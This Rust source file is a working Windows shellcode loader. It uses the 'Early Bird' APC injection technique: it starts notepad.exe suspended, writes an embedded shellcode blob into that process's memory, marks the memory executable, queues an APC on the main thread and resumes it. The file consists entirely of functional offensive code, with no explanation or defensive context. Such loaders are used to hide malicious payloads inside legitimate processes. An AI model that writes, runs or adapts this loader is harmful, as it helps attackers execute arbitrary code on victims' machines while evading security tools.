use std::{
    mem::{transmute, zeroed},
    os::raw::c_void,
    ptr::null_mut,
};

use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
            VirtualProtectEx,
        },
        Threading::{
            CREATE_SUSPENDED, CreateProcessW, PROCESS_INFORMATION, QueueUserAPC, ResumeThread,
            STARTUPINFOW, TerminateProcess,
        },
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE.len();

fn main() {
    let binding = "C:\\Windows\\System32\\notepad.exe\0"
        .encode_utf16()
        .collect::<Vec<u16>>();
    let process_name: &[u16] = binding.as_slice();

    unsafe {
        let mut si: STARTUPINFOW = zeroed();
        si.cb = size_of::<STARTUPINFOW>() as u32;

        let mut pi: PROCESS_INFORMATION = zeroed();

        if CreateProcessW(
            process_name.as_ptr(),
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            println!("[-] Failed to create process.");
            return;
        }

        println!(
            "[+] Created {} with PID: {} TID: {}",
            "notepad.exe", pi.dwProcessId, pi.dwThreadId
        );

        let remote_buffer = VirtualAllocEx(
            pi.hProcess,
            null_mut(),
            SHELLCODE_SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_buffer.is_null() {
            println!("[-] Failed to allocate memory in the remote process.");
            TerminateProcess(pi.hProcess, 0);
            return;
        }

        println!(
            "[+] Allocated {} bytes at {:p}",
            SHELLCODE_SIZE, remote_buffer
        );

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            pi.hProcess,
            remote_buffer,
            SHELLCODE.as_ptr() as *const c_void,
            SHELLCODE_SIZE,
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write shellcode to the remote process.");
            TerminateProcess(pi.hProcess, 0);
            return;
        }

        println!("[+] Wrote {} bytes at {:p}.", bytes_written, remote_buffer);

        let mut old_protect: u32 = 0;
        if VirtualProtectEx(
            pi.hProcess,
            remote_buffer,
            SHELLCODE_SIZE,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            println!("[-] Failed to change memory protection.");
        }

        if QueueUserAPC(transmute(remote_buffer), pi.hThread, 0) == 0 {
            println!("[-] Failed to queue APC.");
        }

        println!("[+] Queued APC to the main thread.");

        ResumeThread(pi.hThread);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
